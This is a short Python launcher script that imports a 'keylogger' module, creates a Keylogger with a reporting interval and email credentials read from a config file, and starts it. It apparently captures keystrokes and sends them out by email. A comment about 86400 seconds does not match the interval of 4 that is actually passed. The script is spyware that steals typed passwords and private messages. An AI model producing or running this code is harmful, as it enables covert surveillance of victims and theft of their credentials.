import keylogger
import config

# 86400 second -> 24 hours
my_keylogger = keylogger.Keylogger(4, config.EMAIL, config.PASSWORD)
my_keylogger.start()
